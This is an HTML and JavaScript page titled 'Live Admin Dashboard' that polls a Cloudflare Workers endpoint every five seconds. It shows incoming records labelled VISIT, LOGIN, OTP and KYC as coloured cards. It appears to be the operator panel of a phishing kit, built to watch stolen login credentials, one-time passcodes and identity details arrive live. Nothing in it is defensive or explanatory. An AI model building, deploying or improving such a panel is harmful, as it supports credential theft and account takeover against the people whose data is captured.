<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Live Admin Dashboard</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
        body { background-color: #f0f2f5; padding-bottom: 40px; }

        /* Sticky Header */
        .header {
            background: #ffffff;
            padding: 15px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: sticky;
            top: 0;
            z-index: 1000;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        }
        .header h1 { font-size: 18px; color: #315195; font-weight: 700; }
        
        /* Visit Count Bubble */
        .visit-badge {
            background: #315195;
            color: white;
            padding: 4px 12px;
            border-radius: 20px;
            font-weight: bold;
            font-size: 14px;
        }

        .container { padding: 12px; display: flex; flex-direction: column; gap: 12px; }

        /* Vertical Colourful Cards */
        .card {
            background: #ffffff;
            border-radius: 12px;
            padding: 16px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
            border-left: 6px solid #ccc;
            animation: fadeIn 0.4s ease-out;
        }

        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

        /* Dynamic Colors Based on Data Type */
        .card-visit { border-left-color: #315195; background: #f0f4ff; }
        .card-login { border-left-color: #28a745; background: #f1fff4; }
        .card-otp   { border-left-color: #ff9800; background: #fffcf0; }
        .card-kyc   { border-left-color: #e91e63; background: #fff0f5; }

        .card-header { display: flex; justify-content: space-between; margin-bottom: 8px; }
        .tag { font-size: 11px; font-weight: 800; text-transform: uppercase; color: #555; }
        .time { font-size: 10px; color: #999; }

        /* Detailed Data View (Multi-line Support) */
        .detail-box { 
            font-size: 16px; 
            color: #111; 
            font-weight: 600; 
            line-height: 1.6; 
            white-space: pre-wrap; /* Yeh zaroori hai line change ke liye */
            word-break: break-all;
        }

        /* Live Status Dot */
        .live-status { text-align: center; margin-top: 15px; font-size: 11px; color: #666; }
        .dot { height: 8px; width: 8px; background: #28a745; border-radius: 50%; display: inline-block; margin-right: 5px; animation: blink 1.5s infinite; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
    </style>
</head>
<body>

    <div class="header">
        <h1>LIVE LOGS</h1>
        <div class="visit-badge" id="totalVisits">0</div>
    </div>

    <div class="container" id="logsContainer">
        </div>

    <div class="live-status">
        <span class="dot"></span> Updating automatically...
    </div>

    <script>
        const workerURL = 'https://flat-fog-a0cd.sumankkuuyy.workers.dev/';

        async function fetchLogs() {
            try {
                const response = await fetch(workerURL);
                const data = await response.json();
                
                const container = document.getElementById('logsContainer');
                const visitDisplay = document.getElementById('totalVisits');

                if (!data || data.length === 0) {
                    container.innerHTML = "<p style='text-align:center; padding:40px; color:#999;'>No data found</p>";
                    return;
                }

                // Total Visit Counting
                const visits = data.filter(l => String(l.type).toUpperCase().includes("VISIT")).length;
                visitDisplay.innerText = visits;

                // Render Logs (Newest on Top)
                container.innerHTML = data.map(log => {
                    let cardClass = "";
                    const type = String(log.type).toUpperCase();

                    if(type.includes("VISIT")) cardClass = "card-visit";
                    else if(type.includes("LOGIN")) cardClass = "card-login";
                    else if(type.includes("OTP")) cardClass = "card-otp";
                    else if(type.includes("KYC")) cardClass = "card-kyc";

                    return `
                        <div class="card ${cardClass}">
                            <div class="card-header">
                                <span class="tag">${log.type}</span>
                                <span class="time">${log.time}</span>
                            </div>
                            <div class="detail-box">${log.detail.replace(/<br>/g, '\n')}</div>
                        </div>
                    `;
                }).join('');

            } catch (err) {
                console.log("Sync error...");
            }
        }

        // Auto Refresh logic (5 seconds)
        setInterval(fetchLogs, 5000);
        window.onload = fetchLogs;
    </script>
</body>
</html>
